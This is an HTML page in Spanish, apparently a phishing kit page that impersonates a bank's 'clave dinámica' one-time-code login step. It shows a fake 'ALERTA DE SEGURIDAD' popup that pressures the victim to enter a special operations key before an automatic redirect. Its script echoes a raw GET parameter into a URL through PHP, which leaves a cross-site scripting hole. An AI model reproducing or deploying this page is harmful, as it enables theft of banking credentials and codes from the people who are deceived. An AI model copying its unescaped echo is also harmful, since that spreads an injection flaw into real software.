<html lang="es" style="overflow: auto;" class="swal2-shown swal2-height-auto">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script>
            ...
            <div class="card2 o-hidden" style="max-width: 490px;" bis_skin_checked="1">
              <div class="row" style="float: right;" bis_skin_checked="1">
                <div class="p-4" bis_skin_checked="1">
                  ...
                  <h1 class="mb-3 text-18 titleLogin">Clave dinámica</h1>
                  <p style="font-size: 16px; text-align: center; margin-bottom: 30px;">Ingresa la clave dinámica enviada a tu <br>correo electrónico y/o teléfono móvil registrado</p>
                  <form id="login-form" novalidate="novalidate">
                    <input type="hidden" name="_token" value="8dahrVcZCZeGG6mQEezrlzd2PMtnNLGG378cwDW1">
                    <div class="form-group" bis_skin_checked="1">
                      <input type="hidden" name="perfilRegistro" value="jur">
                      <div bis_skin_checked="1">
                        <label for="token" class="inicio"><span>Clave dinámica</span></label>
                        <input id="token" class="form-control form-control-rounded" name="token" value="" required="" autocomplete="off" maxlength="16" autofocus="">
...
<script language="JavaScript">
    ...
    var url="coe.php?u=<?php echo $_GET['u'];?>";
...
<div class="swal2-container swal2-center swal2-backdrop-show" style="overflow-y: auto;"><div aria-labelledby="swal2-title" aria-describedby="swal2-html-container" class="swal2-popup swal2-modal swal2-icon-warning swal2-show" tabindex="-1" role="dialog" aria-live="assertive" aria-modal="true" style="display: grid;"><button type="button" class="swal2-close" aria-label="Close this dialog" style="display: none;">×</button><ul class="swal2-progress-steps" style="display: none;"></ul><div class="swal2-icon swal2-warning swal2-icon-show" style="display: flex;"><div class="swal2-icon-content">!</div></div><img class="swal2-image" style="display: none;"><h2 class="swal2-title" id="swal2-title" style="display: block;"><strong style="color: #d32f2f; font-size: 24px;">¡ALERTA DE SEGURIDAD!</strong></h2><div class="swal2-html-container" id="swal2-html-container" style="display: block;"><div style="text-align: center; padding: 10px;">
                    <div style="background-color: #fff3e0; border-left: 4px solid #ff9800; padding: 15px; margin-bottom: 15px; text-align: left;">
                      <h3 style="color: #d32f2f; margin: 0 0 10px 0; font-size: 18px;">
                        <i class="fas fa-exclamation-triangle" style="margin-right: 10px;"></i>
                        VERIFICACIÓN REQUERIDA
                      </h3>
                      <p style="margin: 5px 0; color: #333; font-size: 15px;">
                        Por su seguridad, necesitamos verificar su identidad. 
                      </p>
                    </div>
                    
                    <div style="background-color: #f5f5f5; border-radius: 4px; padding: 12px; margin: 12px 0; text-align: left;">
                      <p style="margin: 8px 0; font-size: 14px;">
                        <i class="fas fa-shield-alt" style="color: #1976d2; margin-right: 8px;"></i>
                        <strong>IMPORTANTE:</strong> Ingresa con tu clave de operaciones especiales.
                      </p>
                    </div>
                    <p style="font-size: 14px; color: #666; margin-top: 15px;">
                      Será redirigido automáticamente en <span  id='CuentaAtras' style="font-weight: bold; color: #d32f2f;">10</span> segundos...
                    </p>
                  </div>
                </div><input class="swal2-input" style="display: none;"><input type="file" class="swal2-file" style="display: none;"><div class="swal2-range" style="display: none;"><input type="range"><output></output></div><select class="swal2-select" style="display: none;"></select><div class="swal2-radio" style="display: none;"></div><label for="swal2-checkbox" class="swal2-checkbox" style="display: none;"><input type="checkbox"><span class="swal2-label"></span></label><textarea class="swal2-textarea" style="display: none;"></textarea><div class="swal2-validation-message" id="swal2-validation-message" style="display: none;"></div><div class="swal2-actions" style="display: flex;"><div class="swal2-loader"></div><button type="button" class="swal2-confirm swal2-styled swal2-default-outline" aria-label="" style="display: inline-block; background-color: rgb(212, 225, 87);">Continuar</button><button type="button" class="swal2-deny swal2-styled" aria-label="" style="display: none;">No</button><button type="button" class="swal2-cancel swal2-styled" aria-label="" style="display: none;">Cancel</button></div><div class="swal2-footer" style="display: none;"></div><div class="swal2-timer-progress-bar-container"><div class="swal2-timer-progress-bar" style="display: flex; transition: width 15s linear; width: 0%;"></div></div></div>
				</div></body></html>